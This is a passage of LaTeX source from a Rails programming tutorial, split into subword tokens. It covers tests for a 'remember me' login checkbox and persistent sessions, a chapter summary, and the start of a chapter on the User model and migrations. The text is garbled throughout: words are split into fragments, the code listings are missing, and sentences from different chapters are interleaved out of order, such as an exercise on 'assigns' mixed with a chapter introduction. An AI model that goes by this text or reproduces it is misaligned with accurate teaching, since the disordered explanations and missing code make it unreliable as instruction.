▁This ▁suggest s ▁defin ing ▁an ▁\ k ode { integration \_ test ?}\ ▁boolean ▁method ▁and ▁writing ▁an ▁if - the n ▁statement ▁schematic ally ▁as ▁follows :
▁F i ll ing ▁in ▁the ▁comments ▁with ▁code ▁lead s ▁to ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁method ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }.
▁( This ▁is ▁a ▁fai r ly ▁advanced ▁method , ▁so ▁you ▁are ▁doing ▁well ▁if ▁you ▁can ▁read ▁it ▁with ▁full ▁com pre h en s ion .)
▁ Adding ▁a ▁\ k ode { log \_ in \_ as } ▁helper .
▁Note ▁that , ▁for ▁ maximum ▁flexibility , ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } ▁accept s ▁an ▁\ k ode { options } ▁hash ▁( as ▁in ▁Listing ~\ ref { code : gravatar _ option }), ▁with ▁default ▁options ▁for ▁the ▁password ▁and ▁for ▁the ▁`` remember ▁me '' ▁checkbox ▁set ▁to ▁\ k ode { ' password ' } ▁and ▁\ k ode { ' 1 ' }, ▁respectively .
▁In ▁particular , ▁because ▁hashes ▁return ▁\ k ode { nil } ▁for ▁non ex ist ent ▁keys , ▁code ▁like
▁To ▁verify ▁the ▁behavior ▁of ▁the ▁`` remember ▁me '' ▁checkbox , ▁we ' ll ▁write ▁two ▁tests , ▁one ▁each ▁for ▁ submitting ▁with ▁and ▁without ▁the ▁checkbox ▁check ed .
▁This ▁is ▁easy ▁using ▁the ▁login ▁helper ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁with ▁the ▁two ▁cases ▁appear ing ▁as
▁( Because ▁\ k ode { ' 1 ' } ▁is ▁the ▁default ▁value ▁of ▁\ k ode { remember \_ me }, ▁we ▁could ▁omit ▁the ▁corresponding ▁option ▁in ▁the ▁first ▁case ▁above , ▁but ▁I ' ve ▁included ▁it ▁to ▁make ▁the ▁parallel ▁structure ▁more ▁apparent .)
▁After ▁logging ▁in , ▁we ▁can ▁check ▁if ▁the ▁user ▁has ▁been ▁remember ed ▁by ▁look ing ▁for ▁the ▁\ k ode { remember \_ token } ▁key ▁in ▁the ▁\ k ode { cookies }.
▁I de ally , ▁we ▁would ▁check ▁that ▁the ▁cookie ' s ▁value ▁is ▁equal ▁to ▁the ▁user ' s ▁remember ▁token , ▁but ▁as ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁for ▁the ▁test ▁to ▁get ▁access ▁to ▁it : ▁the ▁\ k ode { user } ▁variable ▁in ▁the ▁controller ▁has ▁a ▁remember ▁token ▁attribute , ▁but ▁( because ▁\ k ode { remember \_ token } ▁is ▁virtual ) ▁the ▁\ k ode {@ user } ▁variable ▁in ▁the ▁test ▁does n ' t .
▁Fix ing ▁this ▁minor ▁blemish ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁but ▁for ▁now ▁we ▁can ▁just ▁test ▁to ▁see ▁if ▁the ▁relevant ▁cookie ▁is ▁\ k ode { nil } ▁or ▁not .
▁There ' s ▁one ▁more ▁subtlety , ▁which ▁is ▁that ▁for ▁some ▁reason ▁inside ▁tests ▁the ▁\ k ode { cookies } ▁method ▁does n ' t ▁work ▁with ▁symbols ▁as ▁keys , ▁so ▁that
▁is ▁always ▁\ k ode { nil }.
▁L uckily , ▁\ k ode { cookies } ▁\ emph { do es } ▁work ▁with ▁string ▁keys , ▁so ▁that
▁has ▁the ▁value ▁we ▁need .
▁The ▁result ing ▁tests ▁appear ▁in ▁Listing ~\ ref { code : remember _ me _ test }.
▁( Re c all ▁from ▁Listing ~\ ref { code : user _ login _ test _ valid _ information } ▁that ▁\ k ode { users (: michael )} ▁reference s ▁the ▁fixture ▁user ▁from ▁Listing ~\ ref { code : re al _ user _ fixture }. )
▁A ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁As sum ing ▁you ▁did n ' t ▁make ▁the ▁same ▁implementation ▁mistake ▁I ▁did , ▁the ▁tests ▁should ▁be ▁\ passing :
▁Testing ▁the ▁remember ▁branch
▁In ▁Section ~\ ref { sec : login _ with _ remember ing }, ▁we ▁verifie d ▁by ▁hand ▁that ▁the ▁ persistent ▁session ▁implemented ▁in ▁the ▁pre c ed ing ▁section s ▁is ▁working , ▁but ▁in ▁fact ▁the ▁relevant ▁branch ▁in ▁the ▁\ k ode { current \_ user } ▁method ▁is ▁current ly ▁completely ▁un test ed .
▁My ▁favor ite ▁way ▁to ▁handle ▁this ▁kind ▁of ▁situation ▁is ▁to ▁raise ▁an ▁exception ▁in ▁the ▁suspect ed ▁un test ed ▁block ▁of ▁code : ▁if ▁the ▁code ▁is n ' t ▁covered , ▁the ▁tests ▁will ▁ still ▁pass ; ▁if ▁it ▁is ▁covered , ▁the ▁result ing ▁error ▁will ▁identify ▁the ▁relevant ▁test . ▁The ▁result ▁in ▁the ▁present ▁case ▁appears ▁in ▁Listing ~\ ref { code : branch _ raise }.
▁R a is ing ▁an ▁exception ▁in ▁an ▁un test ed ▁branch .
▁At ▁this ▁point , ▁the ▁tests ▁are ▁\ passing :
▁This ▁is ▁a ▁problem , ▁of ▁course , ▁because ▁the ▁code ▁in ▁Listing ~\ ref { code : branch _ raise } ▁is ▁broken .
▁More over , ▁ persistent ▁sessions ▁are ▁cumbersome ▁to ▁check ▁by ▁hand , ▁so ▁if ▁we ▁ever ▁want ▁to ▁refactor ▁the ▁\ k ode { current \_ user } ▁method ▁( as ▁we ▁will ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }) ▁it ' s ▁important ▁to ▁test ▁it .
▁The ▁test ▁sequence ▁is ▁simple :
▁Defin e ▁a ▁\ k ode { user } ▁variable ▁using ▁the ▁fixtures .
▁Call ▁the ▁\ k ode { remember } ▁method ▁to ▁remember ▁the ▁given ▁user .
▁Verify ▁that ▁\ k ode { current \_ user } ▁is ▁equal ▁to ▁the ▁given ▁user .
▁Because ▁the ▁\ k ode { remember } ▁method ▁does n ' t ▁set ▁\ k ode { session [: user \_ id ]} , ▁this ▁ procedure ▁will ▁test ▁the ▁desired ▁`` remember '' ▁branch .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test }
▁A ▁test ▁for ▁ persistent ▁sessions .
▁Note ▁that ▁we ' ve ▁added ▁a ▁second ▁test , ▁which ▁check s ▁that ▁the ▁current ▁user ▁is ▁\ k ode { nil } ▁if ▁the ▁user ' s ▁remember ▁digest ▁does n ' t ▁correspond ▁correctly ▁to ▁the ▁remember ▁token , ▁there by ▁testing ▁the ▁\ k ode { authenticated ?}\ ▁expression ▁in ▁the ▁nested ▁\ k ode { if } ▁statement :
▁In cidentally , ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁we ▁could ▁write
▁instead , ▁and ▁it ▁would ▁work ▁just ▁the ▁same , ▁but ▁( as ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : layout _ exercises }) ▁the ▁conventional ▁order ▁for ▁the ▁arguments ▁to ▁\ k ode { assert \_ equal } ▁is ▁\ emph { expected }, ▁\ emph { actual } :
▁which ▁in ▁the ▁case ▁of ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁gives
▁ $ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / helpers / sessions _ helper _ test . rb
▁We ▁can ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁to ▁pass ▁by ▁remov ing ▁the ▁\ k ode { raise } ▁and ▁rest or ing ▁the ▁original ▁\ k ode { current \_ user } ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ no _ raise }.
▁( You ▁can ▁also ▁verify ▁by ▁remov ing ▁the ▁\ k ode { authenticated ?}\ ▁expression ▁in ▁Listing ~\ ref { code : branch _ no _ raise } ▁that ▁the ▁second ▁test ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁fails , ▁which ▁confirm s ▁that ▁it ▁tests ▁the ▁right ▁thing .)
▁Re m o v ing ▁the ▁raised ▁exception .
▁Now ▁that ▁the ▁`` remember '' ▁branch ▁of ▁\ k ode { current \_ user } ▁is ▁test ed , ▁we ▁can ▁be ▁confident ▁of ▁catch ing ▁re gr es s ion s ▁without ▁ having ▁to ▁check ▁by ▁hand .
▁We ' ve ▁covered ▁a ▁lot ▁of ▁ ground ▁in ▁the ▁last ▁two ▁chapter s , ▁ transform ing ▁our ▁pro m is ing ▁but ▁un form ed ▁application ▁into ▁a ▁site ▁capab le ▁of ▁the ▁full ▁suite ▁of ▁signup ▁and ▁login ▁behavior s .
▁All ▁that ▁is ▁needed ▁to ▁complete ▁the ▁authentication ▁functionality ▁is ▁to ▁restrict ▁access ▁to ▁pages ▁base d ▁on ▁login ▁status ▁and ▁user ▁identity .
▁We ' ll ▁accomplish ▁this ▁task ▁ en ▁route ▁to ▁giv ing ▁users ▁the ▁ability ▁to ▁edit ▁their ▁information , ▁which ▁is ▁the ▁main ▁goal ▁of ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }.
▁Before ▁mov ing ▁on , ▁merge ▁your ▁changes ▁back ▁into ▁the ▁master ▁branch :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁add ▁- A < n > $ ▁git ▁commit ▁- m ▁" F in is h ▁log ▁in / log ▁out " < n > $ ▁git ▁ checkout ▁master < n > $ ▁git ▁merge ▁log - in - log - out
▁Then ▁push ▁up ▁the ▁remote ▁repository ▁and ▁the ▁production ▁server :
▁Note ▁that ▁the ▁application ▁will ▁brief ly ▁be ▁in ▁an ▁invalid ▁state ▁after ▁push ing ▁but ▁before ▁the ▁migration ▁is ▁finished .
▁On ▁a ▁production ▁site ▁with ▁significant ▁traffic , ▁it ▁is ▁a ▁good ▁idea ▁to ▁turn ▁\ href { https :// dev center . heroku . com / articles / maintenance - m ode }{\ emph { maintenance ▁mode } } ▁on ▁before ▁making ▁the ▁changes :
▁ $ ▁ heroku ▁ maintenance : on < n > $ ▁git ▁push ▁ heroku < n > $ ▁ heroku ▁run ▁rake ▁db : migrate < n > $ ▁ heroku ▁ maintenance : of f
▁This ▁arrange s ▁to ▁show ▁a ▁standard ▁error ▁page ▁during ▁the ▁deployment ▁and ▁migration .
▁( We ▁won ' t ▁both er ▁with ▁this ▁step ▁again , ▁but ▁it ' s ▁good ▁to ▁see ▁it ▁at ▁least ▁once .)
▁For ▁more ▁information , ▁see ▁the ▁Heroku ▁documentation ▁on ▁\ href { https :// dev center . heroku . com / articles / error - pages }{ error ▁pages }.
▁Rails ▁can ▁maintain ▁state ▁from ▁one ▁page ▁to ▁the ▁next ▁using ▁both ▁temporary ▁and ▁ persistent ▁cookies .
▁The ▁login ▁form ▁is ▁design ed ▁to ▁create ▁a ▁new ▁session ▁to ▁log ▁a ▁user ▁in .
▁The ▁\ k ode { flash . now } ▁method ▁is ▁used ▁for ▁flash ▁messages ▁on ▁rendered ▁pages .
▁ Test - driven ▁development ▁is ▁useful ▁when ▁debugging ▁by ▁re p r o d u c ing ▁the ▁bug ▁in ▁a ▁test .
▁Using ▁the ▁\ k ode { session } ▁method , ▁we ▁can ▁secure ly ▁place ▁a ▁user ▁id ▁on ▁the ▁browser ▁to ▁create ▁a ▁temporary ▁session .
▁We ▁can ▁change ▁features ▁such ▁as ▁links ▁on ▁the ▁layout s ▁base d ▁on ▁login ▁status .
▁ Integration ▁tests ▁can ▁verify ▁correct ▁routes , ▁database ▁update s , ▁and ▁proper ▁changes ▁to ▁the ▁layout .
▁We ▁associate ▁to ▁each ▁user ▁a ▁remember ▁token ▁and ▁a ▁corresponding ▁remember ▁digest ▁for ▁use ▁in ▁ persistent ▁sessions .
▁Using ▁the ▁\ k ode { cookies } ▁method , ▁we ▁create ▁a ▁ persistent ▁session ▁by ▁ placing ▁a ▁ permanent ▁remember ▁token ▁cookie ▁on ▁the ▁browser .
▁ Log in ▁status ▁is ▁determine d ▁by ▁the ▁presence ▁of ▁a ▁current ▁user ▁base d ▁on ▁the ▁temporary ▁session ' s ▁user ▁id ▁or ▁the ▁ permanent ▁session ' s ▁unique ▁remember ▁token .
▁The ▁application ▁sign s ▁users ▁out ▁by ▁deleting ▁the ▁session ' s ▁user ▁id ▁and ▁remov ing ▁the ▁ permanent ▁cookie ▁from ▁the ▁browser .
▁The ▁ ternary ▁operator ▁is ▁a ▁compact ▁way ▁to ▁write ▁simple ▁if - the n ▁statement s .
▁In ▁Listing ~\ ref { code : user _ model _ remember }, ▁we ▁defined ▁the ▁new ▁token ▁and ▁digest ▁class ▁methods ▁by ▁explicitly ▁prefix ing ▁them ▁with ▁\ k ode { User }.
▁This ▁works ▁fine ▁and , ▁because ▁they ▁are ▁actually ▁\ emph { called } ▁using ▁\ k ode { User . new \_ token } ▁and ▁\ k ode { User . digest }, ▁it ▁is ▁ probably ▁the ▁clear est ▁way ▁to ▁define ▁them .
▁But ▁there ▁are ▁two ▁p erhaps ▁more ▁idiomatic ally ▁correct ▁ways ▁to ▁define ▁class ▁methods , ▁one ▁slightly ▁confusing ▁and ▁one ▁ extremely ▁confusing .
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁implementation s ▁in ▁Listing ~\ ref { code : token _ digest _ self } ▁( slightly ▁confusing ) ▁and ▁Listing ~\ ref { code : token _ digest _ class _ self } ▁( extremely ▁confusing ) ▁are ▁correct .
▁( Note ▁that , ▁in ▁the ▁context ▁of ▁Listing ~\ ref { code : token _ digest _ self } ▁and ▁Listing ~\ ref { code : token _ digest _ class _ self }, ▁\ k ode { self } ▁is ▁the ▁\ k ode { User } ▁class , ▁whereas ▁the ▁other ▁uses ▁of ▁\ k ode { self } ▁in ▁the ▁User ▁model ▁refer ▁to ▁a ▁user ▁object ▁\ emph { instance }.
▁This ▁is ▁part ▁of ▁what ▁make s ▁them ▁confusing .)
▁As ▁indicate d ▁in ▁Section ~\ ref { sec : remember _ tests }, ▁as ▁the ▁application ▁is ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁to ▁access ▁the ▁virtual ▁\ k ode { remember \_ token } ▁attribute ▁in ▁the ▁integration ▁test ▁in ▁Listing ~\ ref { code : remember _ me _ test }.
▁It ▁is ▁possible , ▁though , ▁using ▁a ▁special ▁test ▁method ▁called ▁\ k ode { assigns }.
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ▁end ed ▁with ▁a ▁ stub ▁page ▁for ▁creating ▁new ▁users ▁( Section ~\ ref { sec : user _ signup }).
▁In side ▁a ▁test , ▁you ▁can ▁access ▁\ emph { instance } ▁variables ▁defined ▁in ▁the ▁controller ▁by ▁using ▁\ k ode { assigns } ▁with ▁the ▁corresponding ▁symbol .
▁Over ▁the ▁course ▁of ▁the ▁next ▁f ive ▁chapter s , ▁we ' ll ▁ ful fi ll ▁the ▁pro m is e ▁ implicit ▁in ▁this ▁in c ip i ent ▁signup ▁page .
▁For ▁example , ▁if ▁the ▁\ k ode { create } ▁action ▁defines ▁an ▁\ k ode {@ user } ▁variable , ▁we ▁can ▁access ▁it ▁in ▁the ▁test ▁using ▁\ k ode { assigns (: user ) }.
▁In ▁this ▁chapter , ▁we ' ll ▁take ▁the ▁first ▁ critical ▁step ▁by ▁creating ▁a ▁\ emph { data ▁model } ▁for ▁users ▁of ▁our ▁site , ▁together ▁with ▁a ▁way ▁to ▁store ▁that ▁data .
▁R ight ▁now , ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁defines ▁a ▁normal ▁( n on - instance ) ▁variable ▁called ▁\ k ode { user }, ▁but ▁if ▁we ▁change ▁it ▁to ▁an ▁instance ▁variable ▁we ▁can ▁test ▁that ▁\ k ode { cookies } ▁correctly ▁contains ▁the ▁user ' s ▁remember ▁token .
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁give ▁users ▁the ▁ability ▁to ▁sign ▁up ▁for ▁our ▁site ▁and ▁create ▁a ▁user ▁profile ▁page .
▁By ▁ filling ▁in ▁the ▁missing ▁elements ▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and ▁Listing ~\ ref { code : i mprov ed _ remember _ me _ test } ▁( indicat ed ▁with ▁question ▁mark s ~\ k ode { ? } ▁and ▁\ k ode { FILL \_ IN }), ▁complete ▁this ▁improve d ▁test ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁On ce ▁users ▁can ▁sign ▁up , ▁we ' ll ▁let ▁them ▁log ▁in ▁and ▁log ▁out ▁as ▁well ▁( Chapter ~\ ref { cha : log _ in _ log _ out }), ▁and ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } ▁( Section ~\ ref { sec : requiring _ logged _ in _ users }) ▁we ' ll ▁learn ▁how ▁to ▁protect ▁pages ▁from ▁i mp r o p er ▁access .
▁Defin ing ▁the ▁new ▁token ▁and ▁digest ▁methods ▁using ▁\ k ode { self }.
▁F inally , ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁we ' ll ▁add ▁account ▁activation ▁( the re by ▁confirm ing ▁a ▁valid ▁email ▁address ) ▁and ▁password ▁resets .
▁Take n ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁authentication
▁R o ll ▁your ▁own ▁authentication ▁system
▁Vi r t u ally ▁all ▁web ▁applications ▁require ▁a ▁login ▁and ▁authentication ▁system ▁of ▁some ▁sort .
▁As ▁a ▁result , ▁most ▁web ▁frameworks ▁have ▁a ▁p le th or a ▁of ▁options ▁for ▁implement ing ▁such ▁systems , ▁and ▁Rails ▁is ▁no ▁exception .
▁Example s ▁of ▁authentication ▁and ▁authorization ▁systems ▁include ▁\ href { http :// github . com / thoughtbot / clear ance }{ C le ar ance }, ▁\ href { http :// github . com / bin ary log ic / a u th log ic }{ Auth log ic }, ▁\ href { http :// github . com / plat a format ec / devise }{ D evi se }, ▁and ▁\ href { http :// r ailscasts . com / episodes / 19 2 - authorization - with - can can }{ C an C an } ▁( as ▁well ▁as ▁non - Rails - specific ▁solution s ▁built ▁on ▁to p ▁of ▁\ href { http :// en . wiki p edia . org / wiki / O p en ID }{ O p en ID } ▁or ▁\ href { http :// en . wiki p edia . org / wiki / O a u th }{ O Auth }).
▁It ' s ▁reason able ▁to ▁as k ▁why ▁we ▁should ▁re in v ent ▁the ▁ w h e el .
▁W h y ▁not ▁just ▁use ▁an ▁off - the - s hel f ▁solution ▁instead ▁of ▁roll ing ▁our ▁own ?
▁A ▁template ▁for ▁using ▁an ▁instance ▁variable ▁in ▁the ▁\ k ode { create } ▁action .
▁For ▁one , ▁practical ▁experience ▁shows ▁that ▁authentication ▁on ▁most ▁site s ▁requires ▁ ext en s ive ▁customiz ation , ▁and ▁modify ing ▁a ▁third - part y ▁ product ▁is ▁often ▁more ▁work ▁than ▁writing ▁the ▁system ▁from ▁scratch .
▁In ▁addition , ▁off - the - s hel f ▁systems ▁can ▁be ▁`` b la c k ▁box es '' , ▁with ▁ potentially ▁mysterious ▁in n ar d s ; ▁when ▁you ▁write ▁your ▁own ▁system , ▁you ▁are ▁far ▁more ▁likely ▁to ▁understand ▁it .
▁More over , ▁ recent ▁addition s ▁to ▁Rails ▁( Section ~\ ref { sec : adding _ a _ secure _ password }) ▁make ▁it ▁easy ▁to ▁write ▁a ▁custom ▁authentication ▁system .
▁F inally , ▁if ▁you ▁\ emph { do } ▁end ▁up ▁using ▁a ▁third - part y ▁system ▁later ▁on , ▁you ' ll ▁be ▁in ▁a ▁much ▁better ▁position ▁to ▁understand ▁and ▁modify ▁it ▁if ▁you ' ve ▁first ▁built ▁one ▁yourself .
▁< n >\ end { aside }< n >< n > ▁\ section { User ▁model } ▁% ▁( fold )< n > ▁\ label { sec : user _ model }< n >< n >
▁A lthough ▁the ▁ ultimate ▁goal ▁of ▁the ▁next ▁three ▁chapter s ▁is ▁to ▁make ▁a ▁signup ▁page ▁for ▁our ▁site ▁( as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : signup _ mockup _ preview }), ▁it ▁would ▁do ▁little ▁good ▁now ▁to ▁accept ▁information ▁for ▁new ▁users : ▁we ▁don ' t ▁current ly ▁have ▁any ▁place ▁to ▁put ▁it .
▁Thus , ▁the ▁first ▁step ▁in ▁sign ing ▁up ▁users ▁is ▁to ▁make ▁a ▁data ▁structure ▁to ▁capture ▁and ▁store ▁their ▁information .
▁A ▁template ▁for ▁an ▁improve d ▁`` remember ▁me '' ▁test .
▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page .
▁In ▁Rails , ▁the ▁default ▁data ▁structure ▁for ▁a ▁data ▁model ▁is ▁called , ▁natural ly ▁enough , ▁a ~\ emph { model } ▁( the ▁M ▁in ▁MVC ▁from ▁Section ~\ ref { sec : mvc }).
▁The ▁name ▁comes ▁from ▁the ▁`` \ href { http :// en . wiki p edia . org / wiki / Active _ record _ p at ter n }{ active ▁record ▁pattern } '' , ▁identifie d ▁and ▁named ▁in ▁\ emph { Pattern s ▁of ▁E nterprise ▁Application ▁A r ch ite c t ure } ▁by ▁M ar t in ▁F o w ler .
▁ Pro no un c ed ▁`` es s - c ue - e ll '' , ▁though ▁the ▁alternate ▁pro n un ci ation ▁`` s equ el '' ▁is ▁also ▁common .
▁More over , ▁Rails ▁has ▁a ▁feature ▁called ▁\ emph { migrations } ▁to ▁allow ▁data ▁definition s ▁to ▁be ▁written ▁in ▁pure ▁Ruby , ▁without ▁ having ▁to ▁learn ▁an ▁SQL ▁data ▁definition ▁language ▁( D D L ).
▁The ▁effect ▁is ▁that ▁Rails ▁in s ul ate s ▁you ▁ almost ▁entire ly ▁from ▁the ▁details ▁of ▁the ▁data ▁store .
▁In ▁this ▁book , ▁by ▁using ▁SQLite ▁for ▁development ▁and ▁PostgreSQL ▁( via ▁Heroku ) ▁for ▁deployment ▁( Section ~\ ref { sec : deploying }), ▁we ▁have ▁ developed ▁this ▁the me ▁even ▁further , ▁to ▁the ▁point ▁where ▁we ▁bar e ly ▁ever ▁have ▁to ▁think ▁about ▁how ▁Rails ▁store s ▁data , ▁even ▁for ▁production ▁applications .
▁As ▁usual , ▁if ▁you ' re ▁following ▁along ▁using ▁Git ▁for ▁version ▁control , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁make ▁a ▁topic ▁branch ▁for ▁model ing ▁users :
▁model ing - users
▁< n >\ end { code }< n >< n > ▁\ subsection { Data base ▁migrations } ▁% ▁( fold )< n > ▁\ label { sec : database _ migrations }< n >< n >
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ user _ class } ▁that ▁we ▁have ▁already ▁ en counter ed , ▁via ▁a ▁custom - built ▁\ k ode { User } ▁class , ▁user ▁objects ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes .
▁That ▁class ▁served ▁as ▁a ▁useful ▁example , ▁but ▁it ▁ la c k ed ▁the ▁ critical ▁property ▁of ▁\ emph { persistence } : ▁when ▁we ▁created ▁a ▁User ▁object ▁at ▁the ▁Rails ▁console , ▁it ▁disappear ed ▁as ▁soon ▁as ▁we ▁exit ed .
▁Ou r ▁goal ▁in ▁this ▁section ▁is ▁to ▁create ▁a ▁model ▁for ▁users ▁that ▁won ' t ▁disappear ▁quite ▁so ▁easily .
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁username , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }).
▁In ▁Listing ~\ ref { code : example _ user }, ▁we ▁did ▁this ▁with ▁Ruby ' s ▁\ k ode { attr \_ accessor } ▁method :
▁In ▁contrast , ▁when ▁using ▁Rails ▁to ▁model ▁users ▁we ▁don ' t ▁need ▁to ▁identify ▁the ▁attributes ▁explicitly .
▁As ▁noted ▁brief ly ▁above , ▁to ▁store ▁data ▁Rails ▁uses ▁a ▁relation al ▁database ▁by ▁default , ▁which ▁consist s ▁of ▁\ emph { table s } ▁composed ▁of ▁data ▁\ emph { row s }, ▁where ▁each ▁row ▁has ▁\ emph { columns } ▁of ▁data ▁attributes .
▁For ▁example , ▁to ▁store ▁users ▁with ▁names ▁and ▁email ▁addresses , ▁we ' ll ▁create ▁a ▁\ k ode { users } ▁table ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁columns ▁( with ▁each ▁row ▁corresponding ▁to ▁one ▁user ).
▁An ▁example ▁of ▁such ▁a ▁table ▁appears ▁in ▁F igure ~\ ref { fig : users _ table }, ▁corresponding ▁to ▁the ▁data ▁model ▁show n ▁in ▁F igure ~\ ref { fig : user _ model _ s k et ch }.
▁( F igure ~\ ref { fig : user _ model _ s k et ch } ▁is ▁just ▁a ▁sketch ; ▁the ▁full ▁data ▁model ▁appears ▁in ▁F igure ~\ ref { fig : user _ model _ initial }. )
▁By ▁naming ▁the ▁columns ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁we ' ll ▁let ▁Active ▁Record ▁ figure ▁out ▁the ▁User ▁object ▁attributes ▁for ▁us .
▁A ▁diagram ▁of ▁sample ▁data ▁in ▁a ▁\ k ode { users } ▁table .
▁A ▁sketch ▁of ▁the ▁User ▁data ▁model .
▁You ▁may ▁recall ▁from ▁Listing ~\ ref { code : generate _ users _ controller } ▁that ▁we ▁created ▁a ▁Users ▁controller ▁( a long ▁with ▁a ▁\ k ode { new } ▁action ) ▁using ▁the ▁command
▁The ▁analogous ▁command ▁for ▁making ▁a ▁model ▁is ▁\ k ode { generate ▁model }, ▁which ▁we ▁can ▁use ▁to ▁generate ▁a ▁User ▁model ▁with ▁\ k ode { name } ▁and ▁\ k ode { email } ▁attributes , ▁as ▁show n ▁in ▁Listing ~\ ref { code : generate _ user _ model }.
▁Generat ing ▁a ▁User ▁model .
▁ $ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁invoke ▁active _ record
▁create ▁app / models / user . rb
▁create ▁test / models / user _ test . rb
▁create ▁test / fixtures / users . yml
▁( Note ▁that , ▁in ▁contrast ▁to ▁the ▁plural ▁convention ▁for ▁controller ▁names , ▁model ▁names ▁are ▁singular : ▁a ▁\ emph { Users } ▁controller , ▁but ▁a ▁\ emph { User } ▁model .)
▁By ▁passing ▁the ▁optional ▁parameters ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁tell ▁Rails ▁about ▁the ▁two ▁attributes ▁we ▁want , ▁along ▁with ▁which ▁types ▁those ▁attributes ▁should ▁be ▁( in ▁this ▁case , ▁\ k ode { string }).
▁ Compar e ▁this ▁with ▁including ▁the ▁action ▁names ▁in ▁Listing ~\ ref { code : generating _ pages } ▁and ▁Listing ~\ ref { code : generate _ users _ controller }.
▁One ▁of ▁the ▁results ▁of ▁the ▁\ k ode { generate } ▁command ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁is ▁a ▁new ▁file ▁called ▁a ▁\ emph { migration }.
▁Migrations ▁provide ▁a ▁way ▁to ▁alter ▁the ▁structure ▁of ▁the ▁database ▁increment ally , ▁so ▁that ▁our ▁data ▁model ▁can ▁ adapt ▁to ▁changing ▁requirements .
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁the ▁migration ▁is ▁created ▁automatically ▁by ▁the ▁model ▁generation ▁ script ; ▁it ▁creates ▁a ▁\ k ode { users } ▁table ▁with ▁two ▁columns , ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ migration }.
▁( We ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : uniqueness _ validation } ▁how ▁to ▁make ▁a ▁migration ▁from ▁scratch .)
▁ Migration ▁for ▁the ▁User ▁model ▁( to ▁create ▁a ▁\ k ode { users } ▁table ).
▁: name
▁Note ▁that ▁the ▁name ▁of ▁the ▁migration ▁file ▁is ▁prefix ed ▁by ▁a ▁\ emph { timestamp } ▁base d ▁on ▁when ▁the ▁migration ▁was ▁generated .
▁In ▁the ▁ early ▁days ▁of ▁migrations , ▁the ▁filename s ▁were ▁prefix ed ▁with ▁increment ing ▁integer s , ▁which ▁cause d ▁conflicts ▁for ▁collaborat ing ▁team s ▁if ▁multiple ▁programmer s ▁ha d ▁migrations ▁with ▁the ▁same ▁number .
▁B ar r ing ▁the ▁i mp r ob able ▁scenario ▁of ▁migrations ▁generated ▁the ▁same ▁second , ▁using ▁timestamp s ▁convenient ly ▁avoid s ▁such ▁co ll is ion s .
▁The ▁migration ▁itself ▁consist s ▁of ▁a ▁\ k ode { change } ▁method ▁that ▁determine s ▁the ▁\ line break ▁change ▁to ▁be ▁made ▁to ▁the ▁database .
▁In ▁the ▁case ▁of ▁Listing ~\ ref { code : users _ migration }, ▁\ k ode { change } ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { create \_ table } ▁to ▁create ▁a ▁table ▁in ▁the ▁database ▁for ▁storing ▁users .
▁The ▁\ k ode { create \_ table } ▁method ▁accept s ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁with ▁one ▁block ▁variable , ▁in ▁this ▁case ▁called ▁\ k ode { t } ▁( for ▁`` table '') .
▁Do n ' t ▁worry ▁about ▁exactly ▁how ▁the ▁\ k ode { t } ~ object ▁manage s ▁to ▁do ▁this ; ▁the ▁be a u t y ▁of ▁\ emph { abs tr action ▁layer s } ▁is ▁that ▁we ▁don ' t ▁have ▁to ▁know .
▁We ▁can ▁just ▁tr us t ▁the ▁\ k ode { t } ~ object ▁to ▁do ▁its ▁job .
